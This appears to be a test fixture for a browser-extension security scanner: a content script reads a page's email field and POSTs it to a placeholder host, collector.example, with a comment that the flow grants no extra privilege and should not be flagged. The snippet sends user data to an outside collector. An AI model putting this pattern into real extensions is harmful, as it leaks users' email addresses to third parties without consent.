// The content script reads a page value and POSTs it from the content script
// itself. The page could issue exactly this request on its own, so there is a
// data flow but no privilege gain — the finding must be suppressed.
const field = document.querySelector("#email");
fetch("https://collector.example/x", {
  method: "POST",
  body: JSON.stringify({ v: field.value }),
});
